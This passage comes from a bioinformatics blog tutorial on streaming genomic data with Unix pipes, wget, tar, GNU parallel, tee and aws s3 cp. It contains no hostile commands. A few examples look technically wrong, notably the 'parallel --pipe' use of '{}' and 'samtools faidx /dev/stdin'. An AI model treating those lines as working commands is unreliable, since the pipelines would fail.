63%, 40%)">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">done</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Or more elegantly with GNU tar:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">wget</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-q</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-O</span><span class="token plain"> - https://example.com/genomes.tar.gz </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">tar</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-xz</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-C</span><span class="token plain"> /dev/shm  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Extract to RAM disk (if available)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Disk space: Only final index files</span><br></span></code></pre></div></div>
<p><strong>Better approach with GNU tar's streaming:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Extract specific files from tarball without decompressing entire archive</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">wget</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-q</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-O</span><span class="token plain"> - https://example.com/genomes.tar.gz </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">tar</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-xzf</span><span class="token plain"> - genomes/reference.fasta --to-stdout </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  samtools faidx /dev/stdin</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="example-5-process-multiple-files-from-s3-with-gnu-parallel">Example 5: Process Multiple Files from S3 with GNU Parallel<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#example-5-process-multiple-files-from-s3-with-gnu-parallel" class="hash-link" aria-label="Direct link to Example 5: Process Multiple Files from S3 with GNU Parallel" title="Direct link to Example 5: Process Multiple Files from S3 with GNU Parallel" translate="no">​</a></h3>
<p><strong>Scenario:</strong> Process many files in S3 in parallel using pipes and parallel processing.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># List all BAM files in S3 and process in parallel</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">aws s3 </span><span class="token function" style="color:hsl(221, 87%, 60%)">ls</span><span class="token plain"> s3://my-bucket/bams/ </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--recursive</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">awk</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'{print $4}'</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  parallel </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--pipe</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--block</span><span class="token plain"> 10M </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token string" style="color:hsl(119, 34%, 47%)">'aws s3 cp "s3://my-bucket/{}" - | \</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">   samtools view -b -F 4 | \</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">   samtools sort -o {/.}.sorted.bam -'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># What happens:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 1. List all S3 objects</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 2. Process up to N files in parallel</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 3. Each file is downloaded and piped directly to samtools</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 4. Results written back to disk (or piped to another command)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="example-6-bidirectional-piping-upload-results-as-theyre-generated">Example 6: Bidirectional Piping: Upload Results as They're Generated<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#example-6-bidirectional-piping-upload-results-as-theyre-generated" class="hash-link" aria-label="Direct link to Example 6: Bidirectional Piping: Upload Results as They're Generated" title="Direct link to Example 6: Bidirectional Piping: Upload Results as They're Generated" translate="no">​</a></h3>
<p><strong>Scenario:</strong> Generate analysis results and upload to S3 incrementally (useful for long-running processes).</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Real-time upload of VCF variants as they're discovered</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools mpileup </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> reference.fa sample.bam </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  bcftools call </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-m</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">tee</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token function" style="color:hsl(221, 87%, 60%)">gzip</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> aws s3 </span><span class="token function" style="color:hsl(221, 87%, 60%)">cp</span><span class="token plain"> - s3://my-bucket/variants.vcf.gz</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"^#"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">wc</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-l</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># What happens:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 1. bcftools generates variants</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 2. tee splits the stream into two paths:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#    - First path: gzip and upload to S3 in real-time</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#    - Second path: count total variants</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 3. Both operations happen simultaneously from a single bcftools stream</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 4. Results available in S3 even while analysis continues</span><br></span></code></pre></div></div>
<p><strong>Real-world use case:</strong> Monitoring long-running analyses without waiting for completion:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Start a 24-hour variant calling run with real-time uploading</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">samtools mpileup </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> ref.fa *.bam </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  bcftools call </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-m</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain">/tmp/variants.log </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">tee</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token function" style="color:hsl(221, 87%, 60%)">gzip</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> aws s3 </span><span class="token function" style="color:hsl(221, 87%, 60%)">cp</span><span class="token plain"> - s3://bucket/live-variants.vcf.gz</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">tail</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-100</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"PASS"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> /tmp/latest_variants.txt</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># In another terminal, monitor progress:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">watch</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-n</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">10</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"wc -l /tmp/latest_variants.txt &amp;&amp; aws s3 ls s3://bucket/live-variants.vcf.gz"</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="tips-for-reliable-downloadupload-pipes">Tips for Reliable Download/Upload Pipes<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#tips-for-reliable-downloadupload-pipes" class="hash-link" aria-label="Direct link to Tips for Reliable Download/Upload Pipes" title="Direct link to Tips for Reliable Download/Upload Pipes" translate="no">​</a></h3>
<table><thead><tr><th>Scenario</th><th>Pipe Command</th><th>Notes</th></tr></thead><tbody><tr><td><strong>Download + decompress</strong></td><td><code>wget -O - | gunzip | process</code></td><td>Use <code>-O -</code> to output to stdout</td></tr><tr><td><strong>Upload + compress</strong></td><td><code>process | gzip | aws s3 cp -</code></td><td>Pipe <code>-</code> for stdin/stdout</td></tr><tr><td><strong>S3 download + analyze</strong></td><td><code>aws s3 cp s3://... - | process</code></td><td><code>-</code> reads from stdin to stdout</td></tr><tr><td><strong>Tar extract streaming</strong></td><td><code>wget -O - tar.gz | tar -xz -O file</code></td><td><code>-O</code> or <code>--to-stdout</code> extracts to stdout</td></tr><tr><td><strong>Multiple S3 files</strong></td><td>Use <code>aws s3 ls</code> + <code>parallel</code></td><td>Chain with <code>aws s3 cp s3://... -</code></td></tr><tr><td><strong>Real-time monitoring</strong></td><td>Use <code>tee</code> for branching</td><td>Simultaneous upload and local processing</td></tr><tr><td><strong>Error handling</strong></td><td>Check exit codes with <code>set -o pipefail</code></td><td>S3 errors need to fail the pipeline</td></tr></tbody></table>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="critical-considerations-for-cloud-pipes">Critical Considerations for Cloud Pipes<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#critical-considerations-for-cloud-pipes" class="hash-link" aria-label="Direct link to Critical Considerations for Cloud Pipes" title="Direct link to Critical Considerations for Cloud Pipes" translate="no">​</a></h3>
<p><strong>1. Network vs. Disk Bottleneck</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># If network is slower than local processing:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Download once, process multiple times</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">wget</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-O</span><span class="token plain"> - file.tar.gz </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">tee</span><span class="token plain"> local.tar.gz </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">tar</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-xz</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> process1</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">tar</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-xz</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain"> local.tar.gz </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> process2</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">tar</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-xz</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain"> local.tar.gz </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> process3</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Tradeoff: Local storage vs. network bandwidth</span><br></span></code></pre></div></div>
<p><strong>2. Retry Logic for Failed S3 Operations</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Simple retry with exponential backoff</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">retry_count</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">while</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$retry_count</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-lt</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">3</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">do</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  aws s3 </span><span class="token function" style="color:hsl(221, 87%, 60%)">cp</span><span class="token plain"> s3://bucket/file - </span><span class="token operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain">/dev/null </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">break</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">retry_count</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$((</span><span class="token variable" style="color:hsl(221, 87%, 60%)">retry_count </span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable number" style="color:hsl(35, 99%, 36%)">1</span><span class="token variable" style="color:hsl(221, 87%, 60%)">))</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">sleep</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$((</span><span class="token variable number" style="color:hsl(35, 99%, 36%)">2</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">**</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> retry_count</span><span class="token variable" style="color:hsl(221, 87%, 60%)">))</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">done</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> gunzip </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> process</span><br></span></code></pre></div></div>
<p><strong>3. Monitoring Upload Progress</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Use pv to monitor upload speed</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">process_data </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">pv</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-br</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">gzip</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  aws s3 </span><span class="token function" style="color:hsl(221, 87%, 60%)">cp</span><span class="token plain"> - s3://bucket/file.gz</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Output: [1.2GB/s] or similar</span><br></span></code></pre></div></div>
<p><strong>4. Handling Large Files with Multipart Upload</strong></p>
<p>For files larger than a few GB, AWS S3 multipart uploads are more reliable:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># aws s3 cp already handles multipart, but for custom control:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">process_data </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">gzip</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  aws s3 </span><span class="token function" style="color:hsl(221, 87%, 60%)">cp</span><span class="token plain"> - s3://bucket/large-file.gz </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--sse</span><span class="token plain"> AES256 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    --storage-class GLACIER  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Optional: cheaper storage class</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="real-world-bioinformatics-pipes">Real-World Bioinformatics Pipes<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#real-world-bioinformatics-pipes" class="hash-link" aria-label="Direct link to Real-World Bioinformatics Pipes" title="Direct link to Real-World Bioinformatics Pipes" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="example-1-rna-seq-quality-control-pipeline">Example 1: RNA-seq Quality Control Pipeline<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#example-1-rna-seq-quality-control-pipeline" class="hash-link" aria-label="Direct link to Example 1: RNA-seq Quality Control Pipeline" title="Direct link to Example 1: RNA-seq Quality Control Pipeline" translate="no">​</a></h3>
